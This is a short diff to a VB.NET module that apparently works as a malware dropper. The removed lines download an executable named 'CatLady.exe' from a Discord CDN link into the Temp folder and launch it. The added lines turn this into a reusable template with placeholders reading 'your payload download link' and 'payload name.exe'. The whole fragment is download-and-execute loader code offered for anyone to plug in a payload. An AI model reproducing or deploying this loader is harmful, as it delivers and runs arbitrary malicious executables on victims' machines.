@@ -12,9 +12,9 @@ Module Module1
 
         Using client As New WebClient()
 
-            Dim remoteUri As String = "https://cdn.discordapp.com/attachments/755897516515655730/771951932608479262/CatLady.exe"
+        Dim remoteUri As String = "https://your payload download link"
             Dim mainPath As String = My.Computer.FileSystem.SpecialDirectories.Temp
-            Dim fileName As String = mainPath & "CatLady.exe"
+        Dim fileName As String = mainPath & "payload name.exe"
 
             client.DownloadFile(remoteUri, fileName)
 
@@ -31,7 +31,7 @@ Module Module1
 
         Dim dsgsdd As New ProcessStartInfo
 
-        Dim linkStart As New ProcessStartInfo(path & "CatLady.exe")
+Dim linkStart As New ProcessStartInfo(path & "payload name.exe")
 
         Process.Start(linkStart)
 
